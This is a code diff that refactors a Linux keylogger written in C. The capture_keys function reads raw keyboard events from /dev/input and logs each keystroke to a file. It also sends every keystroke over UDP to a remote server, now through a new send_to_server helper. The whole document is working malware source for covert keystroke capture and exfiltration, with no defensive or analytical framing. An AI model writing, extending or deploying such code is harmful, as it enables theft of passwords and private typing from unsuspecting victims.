@@ -11,62 +11,47 @@
 #include <arpa/inet.h>
 
 #include "keylogger.h"
+#include "interproccess.h"
 
 #define BUFFER_SIZE 512
 
 void capture_keys(FILE *file, char *event, int socket_desc, struct sockaddr_in server_addr)
 {
 	struct input_event ev;
-	int server_struct_length = sizeof(server_addr);
-
 	char path[255] = "/dev/input/";
-
 	strcat(path, event);
-
 	int fd = open(path, O_RDONLY);
 
 	char map[] = "..1234567890-=..qwertyuiop{}..asdfghjkl;'...zxcvbnm,./... ";
-	
 	char message[2] = "0\0";
-	
+
 	while (1)
 	{
-
-		int r = read(fd, &ev, sizeof(ev));
+		read(fd, &ev, sizeof(ev));
 		if ((ev.type == EV_KEY) && (ev.value == 0))
 		{
-			if (ev.code == 28){
+			if (ev.code == 28)
+			{
 				fprintf(file, "\n");
-				if(sendto(socket_desc, "\n", strlen("\n"), 0,
-					 (struct sockaddr*)&server_addr, server_struct_length) < 0){
-					printf("error: unable to send message to external server\n");
-				    }
+				send_to_server("\n", socket_desc, server_addr);
 			}
-				
-				
-			if (ev.code == 14){
+
+			if (ev.code == 14)
+			{
 				fprintf(file, "<=");
-				if(sendto(socket_desc, "<=", strlen("<="), 0,
-					 (struct sockaddr*)&server_addr, server_struct_length) < 0){
-					printf("error: unable to send message to external server\n");
-				    }
+				send_to_server("<=", socket_desc, server_addr);
 			}
-				
+
 			else
 			{
 				fprintf(file, "%c", map[ev.code]);
-				
 				message[0] = map[ev.code];
-				
-				if(sendto(socket_desc, message, strlen(message), 0,
-					 (struct sockaddr*)&server_addr, server_struct_length) < 0){
-					printf("error: unable to send message to external server\n");
-				    }
+				send_to_server(message, socket_desc, server_addr);
 			}
 			fflush(file);
 		}
 	}
-	
+
 	close(socket_desc);
 	close(fd);
 }
